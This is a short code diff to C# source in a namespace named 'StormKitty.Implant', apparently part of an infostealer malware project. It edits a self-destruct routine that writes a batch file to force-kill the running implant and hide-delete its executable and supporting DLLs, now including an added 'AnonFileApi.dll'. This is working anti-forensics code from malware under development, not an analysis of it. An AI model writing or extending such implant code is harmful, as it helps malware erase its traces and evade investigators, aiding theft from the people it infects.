@@ -13,7 +13,8 @@ namespace StormKitty.Implant
             // Paths
             string batch = Path.GetTempFileName() + ".bat";
             string path = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            string dll = Path.Combine(Path.GetDirectoryName(path), "DotNetZip.dll");
+            string dll1 = Path.Combine(Path.GetDirectoryName(path), "DotNetZip.dll");
+            string dll2 = Path.Combine(Path.GetDirectoryName(path), "AnonFileApi.dll");
             int currentPid = Process.GetCurrentProcess().Id;
             // Write batch
             using (StreamWriter sw = File.AppendText(batch))
@@ -21,7 +22,7 @@ namespace StormKitty.Implant
                 sw.WriteLine("chcp 65001");
                 sw.WriteLine("TaskKill /F /IM " + currentPid);
                 sw.WriteLine("Timeout /T 2 /Nobreak");
-                sw.WriteLine($"Del /ah \"{path}\" & Del /ah \"{dll}\"");
+                sw.WriteLine($"Del /ah \"{path}\" & Del /ah \"{dll1}\" & Del /ah \"{dll2}\"");
             }
             // Log
             Logging.Log("SelfDestruct : Running self destruct procedure...");
